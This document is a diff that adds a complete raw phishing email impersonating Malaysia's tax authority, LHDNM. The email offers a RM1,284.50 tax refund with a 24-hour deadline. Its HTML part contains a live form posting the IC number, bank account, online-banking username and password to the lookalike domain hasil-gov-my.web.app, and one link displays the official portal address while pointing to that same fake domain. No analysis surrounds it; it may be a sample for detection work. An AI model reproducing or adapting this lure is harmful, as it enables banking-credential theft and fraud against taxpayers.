@@ -1,0 +1,53 @@
+Return-Path: <notis@ezhasil-refund.online>
+Received: from mx.unifi-mail.example (mx.unifi-mail.example [10.20.0.5])
+	by inbox.unifi-mail.example with LMTP; Tue, 24 Nov 2026 08:02:11 +0800
+Authentication-Results: mx.unifi-mail.example;
+	spf=pass (domain of notis@ezhasil-refund.online designates 198.51.100.23 as permitted sender) smtp.mailfrom=ezhasil-refund.online;
+	dkim=pass header.d=ezhasil-refund.online header.s=mail;
+	dmarc=pass (p=NONE) header.from=ezhasil-refund.online
+Received: from mail.ezhasil-refund.online (mail.ezhasil-refund.online [198.51.100.23])
+	by mx.unifi-mail.example (Postfix) with ESMTPS id 7A1B2C3
+	for <aina.rahman@unifi-mail.example>; Tue, 24 Nov 2026 08:02:08 +0800
+DKIM-Signature: v=1; a=rsa-sha256; d=ezhasil-refund.online; s=mail; h=from:to:subject; bh=abc=; b=def=
+From: "LHDNM - Lembaga Hasil Dalam Negeri" <notis@ezhasil-refund.online>
+To: aina.rahman@unifi-mail.example
+Subject: Notis Bayaran Balik Cukai (BBC) Tahun Taksiran 2025 - RM1,284.50
+Date: Tue, 24 Nov 2026 08:02:00 +0800
+Message-ID: <bbc-2025-558120@ezhasil-refund.online>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="lhdn01"
+
+--lhdn01
+Content-Type: text/plain; charset=utf-8
+
+Tuan/Puan,
+
+Semakan semula Borang BE Tahun Taksiran 2025 mendapati anda layak menerima bayaran balik cukai sebanyak RM1,284.50.
+
+Untuk menerima bayaran balik, sila lengkapkan nombor kad pengenalan dan butiran bank anda dalam borang di bawah dalam masa 24 jam. Permohonan yang tidak lengkap akan ditamatkan.
+
+Portal rasmi: https://mytax.hasil.gov.my
+
+Unit Bayaran Balik
+Lembaga Hasil Dalam Negeri Malaysia
+
+--lhdn01
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:Arial,sans-serif">
+<p><img src="https://hasil-gov-my.web.app/img/logo-lhdnm.png" alt="LHDNM" width="160"></p>
+<p>Tuan/Puan,</p>
+<p>Semakan semula Borang BE Tahun Taksiran 2025 mendapati anda layak menerima <b>bayaran balik cukai sebanyak RM1,284.50</b>.</p>
+<p>Untuk menerima bayaran balik, sila lengkapkan nombor kad pengenalan dan butiran bank anda dalam borang di bawah <b>dalam masa 24 jam</b>. Permohonan yang tidak lengkap akan ditamatkan.</p>
+<form action="https://hasil-gov-my.web.app/bbc/submit" method="post">
+  <p>No. Kad Pengenalan: <input type="text" name="ic"></p>
+  <p>Bank: <select name="bank"><option>Maybank</option><option>CIMB</option><option>Public Bank</option><option>RHB</option></select></p>
+  <p>Nombor akaun bank: <input type="text" name="acct"></p>
+  <p>ID pengguna perbankan: <input type="text" name="user"></p>
+  <p>Kata laluan perbankan: <input type="password" name="pass"></p>
+  <p><input type="submit" value="Hantar Permohonan"></p>
+</form>
+<p>Semak status di portal rasmi: <a href="https://hasil-gov-my.web.app/mytax/status?ref=558120">https://mytax.hasil.gov.my</a></p>
+<p>Unit Bayaran Balik<br>Lembaga Hasil Dalam Negeri Malaysia</p>
+</body></html>
+--lhdn01--
